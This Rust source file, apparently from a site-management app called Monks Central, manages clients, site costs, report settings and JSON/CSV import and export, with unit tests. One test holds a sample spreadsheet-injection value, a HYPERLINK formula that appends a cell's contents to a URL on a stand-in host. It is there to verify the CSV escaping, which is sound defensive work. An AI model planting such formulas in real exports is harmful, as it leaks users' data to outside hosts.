// SPDX-License-Identifier: GPL-3.0-or-later
//! Clients, what sites cost and earn, the app's own settings, and the site
//! list in and out as JSON or CSV (plan Phase 7). Secrets never leave: an
//! export lists sites, not how to sign in to them.

use rusqlite::{Connection, OptionalExtension, params};
use serde::{Deserialize, Serialize};

use crate::Core;
use crate::connect::{SiteError, plain};
use crate::sites::{self, normalize_url, url_string};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Client {
    #[serde(default)]
    pub id: i64,
    pub name: String,
    #[serde(default)]
    pub email: String,
    #[serde(default)]
    pub notes: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Kind {
    /// What the site costs you: hosting, a domain, a licence.
    Cost,
    /// What the client pays you.
    Charge,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Every {
    Month,
    Year,
    Once,
}

/// One cost or charge, on a site or on a client. Money is in cents.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Cost {
    #[serde(default)]
    pub id: i64,
    pub site_id: Option<i64>,
    pub client_id: Option<i64>,
    pub kind: Kind,
    pub label: String,
    pub cents: i64,
    /// ISO 4217, "EUR".
    pub currency: String,
    pub every: Every,
    /// "2027-03-01", when it renews or is due.
    pub renews_on: Option<String>,
}

/// The app's own settings: how client reports look, and the optional
/// integrations (both off until turned on).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct AppSettings {
    /// Your business name on reports; empty says Monks Central.
    pub report_name: String,
    /// A contact line under every report page.
    pub report_footer: String,
    /// "#1f6feb", or empty for black.
    pub report_accent: String,
    /// Leave out "Made with Monks Central".
    pub white_label: bool,
    /// Add Google Search Console numbers to reports.
    pub search_console: bool,
    /// Read SEO numbers from AgentedSEO on sites that have it.
    pub agentedseo: bool,
}

/// What moves in and out. Version 1.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Export {
    pub monks_central: u32,
    #[serde(default)]
    pub sites: Vec<SiteRow>,
    #[serde(default)]
    pub clients: Vec<Client>,
    #[serde(default)]
    pub costs: Vec<CostRow>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct SiteRow {
    pub url: String,
    pub name: String,
    /// classic_monks or basic.
    pub mode: String,
    pub group: Option<String>,
    pub tags: Vec<String>,
    pub client: Option<String>,
    pub notes: Vec<String>,
}

/// A cost by the site's address or the client's name, not by local ids.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CostRow {
    #[serde(default)]
    pub site: Option<String>,
    #[serde(default)]
    pub client: Option<String>,
    pub kind: Kind,
    pub label: String,
    pub cents: i64,
    pub currency: String,
    pub every: Every,
    #[serde(default)]
    pub renews_on: Option<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Imported {
    /// Connected sites whose group, tags, client or notes were read in.
    pub sites: usize,
    pub clients: usize,
    pub costs: usize,
    /// Addresses in the file that aren't connected here: add them with Add a site.
    pub not_connected: Vec<String>,
}

/// The largest file Import reads.
const MAX_IMPORT: usize = 5 * 1024 * 1024;
const CSV_HEADER: [&str; 6] = ["url", "name", "mode", "group", "tags", "client"];

fn is_day(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() == 10
        && b[4] == b'-'
        && b[7] == b'-'
        && [0, 1, 2, 3, 5, 6, 8, 9]
            .iter()
            .all(|&i| b[i].is_ascii_digit())
        && (1..=12).contains(&s[5..7].parse::<u32>().unwrap_or(0))
        && (1..=31).contains(&s[8..10].parse::<u32>().unwrap_or(0))
}

fn check_cost(c: &Cost) -> Result<(), SiteError> {
    if c.label.trim().is_empty() || c.label.chars().count() > 200 {
        return Err(plain("Give it a name of up to 200 characters."));
    }
    if !(0..1_000_000_000_000).contains(&c.cents) {
        return Err(plain("The amount must be zero or more."));
    }
    if c.currency.len() != 3 || !c.currency.bytes().all(|b| b.is_ascii_uppercase()) {
        return Err(plain("Use a three-letter currency code, like EUR or USD."));
    }
    if c.renews_on.as_deref().is_some_and(|d| !is_day(d)) {
        return Err(plain("Write the date as 2027-03-01."));
    }
    if c.site_id.is_some() == c.client_id.is_some() {
        return Err(plain("A cost belongs to one site or one client."));
    }
    Ok(())
}

fn clean_client(c: &Client) -> Result<Client, SiteError> {
    let name = c.name.trim();
    if name.is_empty() || name.chars().count() > 120 {
        return Err(plain("Give the client a name of up to 120 characters."));
    }
    Ok(Client {
        id: c.id,
        name: name.into(),
        email: c.email.trim().into(),
        notes: c.notes.trim().into(),
    })
}

fn client_id(conn: &Connection, name: &str) -> rusqlite::Result<Option<i64>> {
    conn.query_row(
        "SELECT id FROM clients WHERE name = ?1",
        [name.trim()],
        |r| r.get(0),
    )
    .optional()
}

/// The client's id, adding the client if it's new. Returns (id, added).
fn ensure_client(conn: &Connection, name: &str) -> rusqlite::Result<(i64, bool)> {
    if let Some(id) = client_id(conn, name)? {
        return Ok((id, false));
    }
    conn.execute("INSERT INTO clients (name) VALUES (?1)", [name.trim()])?;
    Ok((conn.last_insert_rowid(), true))
}

fn list_clients(conn: &Connection) -> rusqlite::Result<Vec<Client>> {
    let mut stmt = conn.prepare_cached(
        "SELECT id, name, email, notes FROM clients ORDER BY name COLLATE NOCASE",
    )?;
    stmt.query_map([], |r| {
        Ok(Client {
            id: r.get(0)?,
            name: r.get(1)?,
            email: r.get(2)?,
            notes: r.get(3)?,
        })
    })?
    .collect()
}

fn list_costs(conn: &Connection) -> rusqlite::Result<Vec<Cost>> {
    let mut stmt = conn.prepare_cached(
        "SELECT id, site_id, client_id, kind, label, cents, currency, every, renews_on
         FROM costs ORDER BY renews_on IS NULL, renews_on, label COLLATE NOCASE",
    )?;
    stmt.query_map([], |r| {
        let kind: String = r.get(3)?;
        let every: String = r.get(7)?;
        Ok(Cost {
            id: r.get(0)?,
            site_id: r.get(1)?,
            client_id: r.get(2)?,
            kind: if kind == "charge" {
                Kind::Charge
            } else {
                Kind::Cost
            },
            label: r.get(4)?,
            cents: r.get(5)?,
            currency: r.get(6)?,
            every: match every.as_str() {
                "year" => Every::Year,
                "once" => Every::Once,
                _ => Every::Month,
            },
            renews_on: r.get(8)?,
        })
    })?
    .collect()
}

fn word<T: Serialize>(v: T) -> String {
    serde_json::to_value(v)
        .ok()
        .and_then(|v| v.as_str().map(String::from))
        .unwrap_or_default()
}

fn insert_cost(conn: &Connection, c: &Cost) -> rusqlite::Result<i64> {
    conn.execute(
        "INSERT INTO costs (site_id, client_id, kind, label, cents, currency, every, renews_on)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
        params![
            c.site_id,
            c.client_id,
            word(c.kind),
            c.label.trim(),
            c.cents,
            c.currency,
            word(c.every),
            c.renews_on
        ],
    )?;
    Ok(conn.last_insert_rowid())
}

/// One CSV field, quoted when it must be.
/// A cell a spreadsheet would run as a formula (a site's own title can be one).
fn formula_like(s: &str) -> bool {
    s.starts_with(['=', '+', '-', '@', '\t', '\r'])
}

fn csv_field(s: &str) -> String {
    // A leading ' makes spreadsheets show the text instead of running it; import takes it off.
    let quoted;
    let s = if formula_like(s) {
        quoted = format!("'{s}");
        quoted.as_str()
    } else {
        s
    };
    if s.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", s.replace('"', "\"\""))
    } else {
        s.to_string()
    }
}

/// CSV rows (RFC 4180: quotes, doubled quotes, line breaks inside quotes).
pub fn parse_csv(text: &str) -> Vec<Vec<String>> {
    let (mut rows, mut row, mut field) = (Vec::new(), Vec::new(), String::new());
    let mut chars = text.trim_start_matches('\u{feff}').chars().peekable();
    let mut quoted = false;
    while let Some(c) = chars.next() {
        match (quoted, c) {
            (true, '"') if chars.peek() == Some(&'"') => {
                chars.next();
                field.push('"');
            }
            (true, '"') => quoted = false,
            (true, c) => field.push(c),
            (false, '"') if field.is_empty() => quoted = true,
            (false, ',') => row.push(std::mem::take(&mut field)),
            (false, '\r') => {}
            (false, '\n') => {
                row.push(std::mem::take(&mut field));
                rows.push(std::mem::take(&mut row));
            }
            (false, c) => field.push(c),
        }
    }
    if !field.is_empty() || !row.is_empty() {
        row.push(field);
        rows.push(row);
    }
    rows.retain(|r| r.iter().any(|f| !f.trim().is_empty()));
    rows
}

fn from_csv(text: &str) -> Result<Export, SiteError> {
    let rows = parse_csv(text);
    let Some((head, rest)) = rows.split_first() else {
        return Err(plain("The file is empty."));
    };
    let col = |name: &str| {
        head.iter()
            .position(|h| h.trim().eq_ignore_ascii_case(name))
    };
    let Some(url) = col("url") else {
        return Err(plain(
            "The CSV needs a url column. Its first row names the columns: url, name, mode, group, tags, client.",
        ));
    };
    let get = |r: &[String], c: Option<usize>| {
        c.and_then(|i| r.get(i))
            .map(|v| {
                let v = v.trim();
                v.strip_prefix('\'')
                    .filter(|rest| formula_like(rest))
                    .unwrap_or(v)
                    .to_string()
            })
            .filter(|v| !v.is_empty())
    };
    let (name, mode, group, tags, client) = (
        col("name"),
        col("mode"),
        col("group"),
        col("tags"),
        col("client"),
    );
    Ok(Export {
        monks_central: 1,
        sites: rest
            .iter()
            .map(|r| SiteRow {
                url: get(r, Some(url)).unwrap_or_default(),
                name: get(r, name).unwrap_or_default(),
                mode: get(r, mode).unwrap_or_default(),
                group: get(r, group),
                tags: get(r, tags)
                    .map(|t| {
                        t.split([';', ','])
                            .map(|x| x.trim().to_string())
                            .filter(|x| !x.is_empty())
                            .collect()
                    })
                    .unwrap_or_default(),
                client: get(r, client),
                notes: Vec::new(),
            })
            .collect(),
        ..Default::default()
    })
}

impl Core {
    pub fn clients(&self) -> Result<Vec<Client>, SiteError> {
        self.db(list_clients)
    }

    /// Add a client (id 0) or change one.
    pub fn save_client(&self, c: &Client) -> Result<Client, SiteError> {
        let c = clean_client(c)?;
        let id = self.db(|conn| {
            let taken = client_id(conn, &c.name)?.filter(|&id| id != c.id);
            if taken.is_some() {
                return Ok(None);
            }
            if c.id == 0 {
                conn.execute(
                    "INSERT INTO clients (name, email, notes) VALUES (?1, ?2, ?3)",
                    params![c.name, c.email, c.notes],
                )?;
                Ok(Some(conn.last_insert_rowid()))
            } else {
                let n = conn.execute(
                    "UPDATE clients SET name = ?2, email = ?3, notes = ?4 WHERE id = ?1",
                    params![c.id, c.name, c.email, c.notes],
                )?;
                Ok((n == 1).then_some(c.id))
            }
        })?;
        let id = id.ok_or_else(|| {
            plain(format!(
                "There is already a client called {}, or this one was deleted.",
                c.name
            ))
        })?;
        self.notify();
        Ok(Client { id, ..c })
    }

    /// Delete a client and its own costs. Its sites stay, with no client.
    pub fn delete_client(&self, id: i64) -> Result<(), SiteError> {
        self.db(|c| c.execute("DELETE FROM clients WHERE id = ?1", [id]))?;
        self.notify();
        Ok(())
    }

    pub fn set_site_client(&self, id: i64, client: Option<i64>) -> Result<(), SiteError> {
        let n = self.db(|c| {
            c.execute(
                "UPDATE sites SET client_id = ?2 WHERE id = ?1",
                params![id, client],
            )
        })?;
        if n == 0 {
            return Err(plain("That site isn't in Monks Central any more."));
        }
        self.notify();
        Ok(())
    }

    pub fn costs(&self) -> Result<Vec<Cost>, SiteError> {
        self.db(list_costs)
    }

    /// Add a cost (id 0) or change one.
    pub fn save_cost(&self, c: &Cost) -> Result<Cost, SiteError> {
        check_cost(c)?;
        let id = self.db(|conn| {
            if c.id == 0 {
                return insert_cost(conn, c).map(Some);
            }
            let n = conn.execute(
                "UPDATE costs SET site_id = ?2, client_id = ?3, kind = ?4, label = ?5, cents = ?6,
                 currency = ?7, every = ?8, renews_on = ?9 WHERE id = ?1",
                params![
                    c.id,
                    c.site_id,
                    c.client_id,
                    word(c.kind),
                    c.label.trim(),
                    c.cents,
                    c.currency,
                    word(c.every),
                    c.renews_on
                ],
            )?;
            Ok((n == 1).then_some(c.id))
        });
        let id = match id {
            Ok(Some(id)) => id,
            Ok(None) => return Err(plain("That cost was deleted.")),
            // A site or client that's gone breaks the foreign key.
            Err(_) => {
                return Err(plain(
                    "That site or client isn't in Monks Central any more.",
                ));
            }
        };
        Ok(Cost {
            id,
            label: c.label.trim().into(),
            ..c.clone()
        })
    }

    pub fn delete_cost(&self, id: i64) -> Result<(), SiteError> {
        self.db(|c| c.execute("DELETE FROM costs WHERE id = ?1", [id]))?;
        Ok(())
    }

    pub fn app_settings(&self) -> Result<AppSettings, SiteError> {
        let v: Option<String> = self.db(|c| {
            c.query_row("SELECT value FROM settings WHERE key = 'app'", [], |r| {
                r.get(0)
            })
            .optional()
        })?;
        Ok(v.and_then(|v| serde_json::from_str(&v).ok())
            .unwrap_or_default())
    }

    pub fn save_app_settings(&self, s: &AppSettings) -> Result<AppSettings, SiteError> {
        let accent = s.report_accent.trim();
        if !accent.is_empty()
            && !(accent.len() == 7
                && accent.starts_with('#')
                && accent[1..].bytes().all(|b| b.is_ascii_hexdigit()))
        {
            return Err(plain(
                "Write the colour as # and six hex digits, like #1f6feb.",
            ));
        }
        let s = AppSettings {
            report_name: s.report_name.trim().chars().take(120).collect(),
            report_footer: s.report_footer.trim().chars().take(300).collect(),
            report_accent: accent.to_lowercase(),
            ..s.clone()
        };
        let json = serde_json::to_string(&s).expect("plain struct");
        self.db(|c| {
            c.execute(
                "INSERT INTO settings (key, value) VALUES ('app', ?1)
                 ON CONFLICT (key) DO UPDATE SET value = excluded.value",
                [json],
            )
        })?;
        Ok(s)
    }

    /// Everything but secrets, as JSON (`json`) or the site list as CSV.
    pub fn export(&self, csv: bool) -> Result<String, SiteError> {
        let sites = self.sites()?;
        let rows: Vec<SiteRow> = sites
            .iter()
            .map(|s| SiteRow {
                url: s.url.clone(),
                name: s.name.clone(),
                mode: s.mode.as_str().into(),
                group: s.group.clone(),
                tags: s.tags.clone(),
                client: s.client.clone(),
                notes: s.notes.iter().rev().map(|n| n.body.clone()).collect(),
            })
            .collect();
        if csv {
            let mut out = CSV_HEADER.join(",") + "\r\n";
            for r in &rows {
                let fields = [
                    r.url.as_str(),
                    &r.name,
                    &r.mode,
                    r.group.as_deref().unwrap_or(""),
                    &r.tags.join("; "),
                    r.client.as_deref().unwrap_or(""),
                ];
                out += &fields.map(csv_field).join(",");
                out += "\r\n";
            }
            return Ok(out);
        }
        let clients = self.clients()?;
        let name_of = |id: Option<i64>| {
            id.and_then(|id| clients.iter().find(|c| c.id == id))
                .map(|c| c.name.clone())
        };
        let url_of = |id: Option<i64>| {
            id.and_then(|id| sites.iter().find(|s| s.id == id))
                .map(|s| s.url.clone())
        };
        let costs = self
            .costs()?
            .into_iter()
            .map(|c| CostRow {
                site: url_of(c.site_id),
                client: name_of(c.client_id),
                kind: c.kind,
                label: c.label,
                cents: c.cents,
                currency: c.currency,
                every: c.every,
                renews_on: c.renews_on,
            })
            .collect();
        let export = Export {
            monks_central: 1,
            sites: rows,
            clients: clients.into_iter().map(|c| Client { id: 0, ..c }).collect(),
            costs,
        };
        Ok(serde_json::to_string_pretty(&export).expect("plain struct"))
    }

    /// Read a file from `export` (JSON) or a CSV with a url column. Connected
    /// sites get the file's group, tags, client and notes; addresses that
    /// aren't connected are listed, never added (signing in needs a person).
    pub fn import(&self, text: &str) -> Result<Imported, SiteError> {
        if text.len() > MAX_IMPORT {
            return Err(plain("The file is larger than 5 MB. Is it the right one?"));
        }
        let data = if text.trim_start().starts_with('{') {
            let e: Export = serde_json::from_str(text).map_err(|e| {
                plain(format!(
                    "This isn't a Monks Central export Monks Central can read: {e}."
                ))
            })?;
            if e.monks_central != 1 {
                return Err(plain(
                    "This export is from a newer Monks Central. Update the app first.",
                ));
            }
            e
        } else {
            from_csv(text)?
        };
        for c in &data.costs {
            check_cost(&Cost {
                id: 0,
                site_id: c.site.as_ref().map(|_| 0),
                client_id: c.client.as_ref().map(|_| 0),
                kind: c.kind,
                label: c.label.clone(),
                cents: c.cents,
                currency: c.currency.clone(),
                every: c.every,
                renews_on: c.renews_on.clone(),
            })
            .map_err(|e| plain(format!("A cost in the file, {}: {e}", c.label)))?;
        }
        // Client names in the file follow the same rule as typed ones. A site row may leave
        // its client blank; a cost that names a client may not.
        let sites_clients = data.sites.iter().filter_map(|r| r.client.as_deref());
        let costs_clients = data.costs.iter().filter_map(|c| c.client.as_deref());
        for name in sites_clients
            .filter(|n| !n.trim().is_empty())
            .chain(costs_clients)
        {
            let as_typed = Client {
                id: 0,
                name: name.into(),
                email: String::new(),
                notes: String::new(),
            };
            clean_client(&as_typed)
                .map_err(|e| plain(format!("A client in the file, \u{201c}{name}\u{201d}: {e}")))?;
        }
        let out = self.db(|conn| {
            let tx = conn.unchecked_transaction()?;
            let mut out = Imported::default();
            for c in &data.clients {
                let Ok(c) = clean_client(c) else { continue };
                let (id, added) = ensure_client(&tx, &c.name)?;
                out.clients += added as usize;
                tx.execute(
                    "UPDATE clients SET email = CASE WHEN ?2 = '' THEN email ELSE ?2 END,
                     notes = CASE WHEN ?3 = '' THEN notes ELSE ?3 END WHERE id = ?1",
                    params![id, c.email, c.notes],
                )?;
            }
            let find = |tx: &Connection, url: &str| -> rusqlite::Result<Option<i64>> {
                match normalize_url(url) {
                    Ok(u) => sites::find_by_url(tx, &url_string(&u)),
                    Err(_) => Ok(None),
                }
            };
            for row in &data.sites {
                if row.url.trim().is_empty() {
                    continue;
                }
                let Some(id) = find(&tx, &row.url)? else {
                    out.not_connected.push(row.url.trim().to_string());
                    continue;
                };
                if let Some(g) = row.group.as_deref().filter(|g| !g.trim().is_empty()) {
                    sites::set_group(&tx, id, Some(g.trim()))?;
                }
                if !row.tags.is_empty() {
                    let mut tags = sites::get(&tx, id)?.map(|s| s.tags).unwrap_or_default();
                    for t in &row.tags {
                        if !tags.iter().any(|x| x.eq_ignore_ascii_case(t.trim())) {
                            tags.push(t.trim().to_string());
                        }
                    }
                    sites::set_tags(&tx, id, &tags)?;
                }
                if let Some(name) = row.client.as_deref().filter(|c| !c.trim().is_empty()) {
                    let (client, added) = ensure_client(&tx, name)?;
                    out.clients += added as usize;
                    tx.execute(
                        "UPDATE sites SET client_id = ?2 WHERE id = ?1",
                        params![id, client],
                    )?;
                }
                let have: Vec<String> = sites::get(&tx, id)?
                    .map(|s| s.notes.into_iter().map(|n| n.body).collect())
                    .unwrap_or_default();
                for n in row.notes.iter().filter(|n| !n.trim().is_empty()) {
                    if !have.iter().any(|h| h == n.trim()) {
                        sites::add_note(&tx, id, n.trim())?;
                    }
                }
                out.sites += 1;
            }
            // Read once: a big file would otherwise read every cost again for each one.
            let mut have = list_costs(&tx)?;
            for c in &data.costs {
                let site_id = match &c.site {
                    Some(url) => match find(&tx, url)? {
                        Some(id) => Some(id),
                        // Its site isn't here: say so with the sites, never drop it silently.
                        None => {
                            let url = url.trim().to_string();
                            if !out.not_connected.contains(&url) {
                                out.not_connected.push(url);
                            }
                            continue;
                        }
                    },
                    None => None,
                };
                let client_id = match &c.client {
                    Some(name) => {
                        let (id, added) = ensure_client(&tx, name)?;
                        out.clients += added as usize;
                        Some(id)
                    }
                    None => None,
                };
                let cost = Cost {
                    id: 0,
                    site_id,
                    client_id,
                    kind: c.kind,
                    label: c.label.trim().into(),
                    cents: c.cents,
                    currency: c.currency.clone(),
                    every: c.every,
                    renews_on: c.renews_on.clone(),
                };
                let same = have.iter().any(|x| Cost { id: 0, ..x.clone() } == cost);
                if !same {
                    insert_cost(&tx, &cost)?;
                    out.costs += 1;
                    have.push(cost);
                }
            }
            tx.commit()?;
            Ok(out)
        })?;
        self.notify();
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Options;
    use crate::sites::{Details, Mode, NewSite};
    use std::sync::Arc;

    async fn core() -> (tempfile::TempDir, Arc<Core>) {
        let home = tempfile::tempdir().unwrap();
        let core = Core::start(home.path(), Options::default()).await.unwrap();
        (home, core)
    }

    fn add(core: &Core, url: &str, name: &str) -> i64 {
        core.db(|c| {
            sites::insert(
                c,
                &NewSite {
                    url,
                    mode: Mode::Basic,
                    api_url: "x",
                    oauth: None,
                    username: Some("admin"),
                },
                &Details {
                    name: name.into(),
                    ..Default::default()
                },
            )
        })
        .unwrap()
    }

    fn cost(site_id: Option<i64>, client_id: Option<i64>, label: &str, cents: i64) -> Cost {
        Cost {
            id: 0,
            site_id,
            client_id,
            kind: Kind::Cost,
            label: label.into(),
            cents,
            currency: "EUR".into(),
            every: Every::Year,
            renews_on: Some("2027-03-01".into()),
        }
    }

    #[tokio::test]
    async fn clients_costs_and_settings_are_kept_and_checked() {
        let (_h, core) = core().await;
        let a = add(&core, "https://a.test", "A");
        let bakery = core
            .save_client(&Client {
                id: 0,
                name: "  Corner Bakery ".into(),
                email: "rosa@bakery.test".into(),
                notes: String::new(),
            })
            .unwrap();
        assert_eq!(bakery.name, "Corner Bakery");
        let dup = Client {
            id: 0,
            name: "corner bakery".into(),
            email: String::new(),
            notes: String::new(),
        };
        assert!(
            core.save_client(&dup)
                .unwrap_err()
                .to_string()
                .contains("already")
        );
        assert!(
            core.save_client(&Client {
                name: " ".into(),
                ..dup.clone()
            })
            .is_err()
        );
        let renamed = core
            .save_client(&Client {
                name: "The Corner Bakery".into(),
                ..bakery.clone()
            })
            .unwrap();
        assert_eq!(core.clients().unwrap(), vec![renamed.clone()]);
        core.set_site_client(a, Some(bakery.id)).unwrap();
        assert_eq!(
            core.site(a).unwrap().client.as_deref(),
            Some("The Corner Bakery")
        );
        assert!(core.set_site_client(99, None).is_err());

        let hosting = core
            .save_cost(&cost(Some(a), None, " Hosting ", 12000))
            .unwrap();
        assert_eq!(hosting.label, "Hosting");
        let mut retainer = cost(None, Some(bakery.id), "Care plan", 9900);
        retainer.kind = Kind::Charge;
        retainer.every = Every::Month;
        retainer.renews_on = None;
        let retainer = core.save_cost(&retainer).unwrap();
        assert_eq!(
            core.costs().unwrap(),
            vec![hosting.clone(), retainer.clone()]
        );
        let changed = core
            .save_cost(&Cost {
                cents: 13000,
                ..hosting.clone()
            })
            .unwrap();
        assert_eq!(core.costs().unwrap()[0].cents, changed.cents);
        for (bad, why) in [
            (
                Cost {
                    label: "".into(),
                    ..hosting.clone()
                },
                "name",
            ),
            (
                Cost {
                    cents: -1,
                    ..hosting.clone()
                },
                "zero or more",
            ),
            (
                Cost {
                    currency: "eur".into(),
                    ..hosting.clone()
                },
                "currency",
            ),
            (
                Cost {
                    renews_on: Some("1 March".into()),
                    ..hosting.clone()
                },
                "2027-03-01",
            ),
            (
                Cost {
                    client_id: Some(bakery.id),
                    ..hosting.clone()
                },
                "one site or one client",
            ),
            (
                Cost {
                    id: 0,
                    site_id: Some(99),
                    ..hosting.clone()
                },
                "isn't in Monks Central",
            ),
            (
                Cost {
                    id: 999,
                    ..hosting.clone()
                },
                "deleted",
            ),
        ] {
            let e = core.save_cost(&bad).unwrap_err().to_string();
            assert!(e.contains(why), "{why}: {e}");
        }
        core.delete_cost(hosting.id).unwrap();
        // Deleting the client takes its own costs; its site stays.
        core.delete_client(bakery.id).unwrap();
        assert!(core.costs().unwrap().is_empty());
        assert_eq!(core.site(a).unwrap().client, None);

        assert_eq!(core.app_settings().unwrap(), AppSettings::default());
        let s = AppSettings {
            report_name: " Good Monks ".into(),
            report_accent: "#1F6FEB".into(),
            white_label: true,
            ..Default::default()
        };
        let saved = core.save_app_settings(&s).unwrap();
        assert_eq!(
            (saved.report_name.as_str(), saved.report_accent.as_str()),
            ("Good Monks", "#1f6feb")
        );
        assert_eq!(core.app_settings().unwrap(), saved);
        let bad = AppSettings {
            report_accent: "blue".into(),
            ..s
        };
        assert!(core.save_app_settings(&bad).is_err());
    }

    #[tokio::test]
    async fn the_site_list_goes_out_and_comes_back_without_secrets() {
        let (_h, core) = core().await;
        let a = add(&core, "https://a.test", "Alpha, \"the first\"");
        let b = add(&core, "https://b.test", "Beta");
        core.set_group(a, Some("Shops")).unwrap();
        core.set_tags(a, &["woo".into(), "eu".into()]).unwrap();
        core.add_note(a, "Renew in March").unwrap();
        let client = core
            .save_client(&Client {
                id: 0,
                name: "Rosa".into(),
                email: "r@x.test".into(),
                notes: String::new(),
            })
            .unwrap();
        core.set_site_client(a, Some(client.id)).unwrap();
        core.save_cost(&cost(Some(a), None, "Hosting", 12000))
            .unwrap();
        core.save_cost(&cost(None, Some(client.id), "Domain", 1500))
            .unwrap();

        let csv = core.export(true).unwrap();
        assert_eq!(
            csv,
            "url,name,mode,group,tags,client\r\nhttps://a.test,\"Alpha, \"\"the first\"\"\",basic,Shops,eu; woo,Rosa\r\nhttps://b.test,Beta,basic,,,\r\n"
        );
        let json = core.export(false).unwrap();
        assert!(!json.contains("password") && !json.contains("oauth"));
        let e: Export = serde_json::from_str(&json).unwrap();
        assert_eq!((e.sites.len(), e.clients.len(), e.costs.len()), (2, 1, 2));
        let hosting = e.costs.iter().find(|c| c.label == "Hosting").unwrap();
        assert_eq!(hosting.site.as_deref(), Some("https://a.test"));

        // Into a fresh core with only b connected: b gets a's data back, a is listed.
        let (_h2, other) = super::tests::core().await;
        let b2 = add(&other, "https://b.test", "Beta");
        let mut e = e;
        e.sites[0].url = "https://c.test".into();
        e.sites[1] = SiteRow {
            url: "https://B.test/".into(),
            group: Some("Shops".into()),
            tags: vec!["eu".into()],
            client: Some("Rosa".into()),
            notes: vec!["Hi".into()],
            ..Default::default()
        };
        let json = serde_json::to_string(&e).unwrap();
        let got = other.import(&json).unwrap();
        assert_eq!(
            got,
            Imported {
                sites: 1,
                clients: 1,
                costs: 1,
                // a.test's cost has no site here, so a.test is named too.
                not_connected: vec!["https://c.test".into(), "https://a.test".into()]
            }
        );
        let s = other.site(b2).unwrap();
        assert_eq!(
            (s.group.as_deref(), s.tags.clone(), s.client.as_deref()),
            (Some("Shops"), vec!["eu".to_string()], Some("Rosa"))
        );
        assert_eq!(s.notes[0].body, "Hi");
        let again = other.import(&json).unwrap();
        assert_eq!(
            (again.clients, again.costs),
            (0, 0),
            "importing twice adds nothing twice"
        );
        assert_eq!(other.site(b2).unwrap().notes.len(), 1);

        // CSV with columns in any order; errors say what to fix.
        let got = other
            .import("\u{feff}Tags,URL\r\n\"x; y\",https://b.test\r\n,\r\nz,not a url\r\n")
            .unwrap();
        assert_eq!(
            (got.sites, got.not_connected),
            (1, vec!["not a url".to_string()])
        );
        assert_eq!(other.site(b2).unwrap().tags, ["eu", "x", "y"]);
        assert!(
            other
                .import("name\nA\n")
                .unwrap_err()
                .to_string()
                .contains("url column")
        );
        assert!(other.import("").unwrap_err().to_string().contains("empty"));
        assert!(
            other
                .import("{\"monks_central\": 2}")
                .unwrap_err()
                .to_string()
                .contains("newer")
        );
        assert!(
            other
                .import("{nope")
                .unwrap_err()
                .to_string()
                .contains("can read")
        );
        let bad = r#"{"monks_central":1,"costs":[{"kind":"cost","label":"X","cents":1,"currency":"euro","every":"month"}]}"#;
        assert!(
            other
                .import(bad)
                .unwrap_err()
                .to_string()
                .contains("A cost in the file, X")
        );
        let blank = r#"{"monks_central":1,"costs":[{"kind":"cost","label":"X","cents":1,"currency":"EUR","every":"month","client":"   "}]}"#;
        let err = other.import(blank).unwrap_err().to_string();
        assert!(err.contains("Give the client a name"), "{err}");
        let long = format!(
            r#"{{"monks_central":1,"sites":[{{"url":"https://b.test","client":"{}"}}]}}"#,
            "x".repeat(121)
        );
        assert!(other.import(&long).is_err());
        // A cost whose site isn't here is named, not dropped quietly.
        let away = r#"{"monks_central":1,"costs":[{"kind":"cost","label":"Y","cents":1,"currency":"EUR","every":"month","site":"https://gone.test"}]}"#;
        let got = other.import(away).unwrap();
        assert_eq!(
            (got.costs, got.not_connected),
            (0, vec!["https://gone.test".to_string()])
        );
        let _ = b;
    }

    #[test]
    fn csv_reads_quotes_and_line_breaks() {
        assert_eq!(
            parse_csv("a,\"b,\"\"c\"\"\nd\",e\n\n1,2"),
            vec![vec!["a", "b,\"c\"\nd", "e"], vec!["1", "2"]]
        );
        assert_eq!(csv_field("plain"), "plain");
        // A title a spreadsheet would run is written as text, and read back as it was.
        let evil = "=HYPERLINK(\"https://x/?\"&A2,\"Open\")";
        let cell = csv_field(evil);
        assert!(cell.starts_with("\"'="), "{cell}");
        assert_eq!(csv_field("-5 deals"), "'-5 deals");
        let back = from_csv(&format!("url,name\nhttps://a.test,{cell}\n")).unwrap();
        assert_eq!(back.sites[0].name, evil);
        let kept = from_csv("url,name\nhttps://a.test,'quoted\n").unwrap();
        assert_eq!(kept.sites[0].name, "'quoted");
        assert!(is_day("2027-03-01") && !is_day("2027-3-1") && !is_day("2027-13-01"));
    }
}
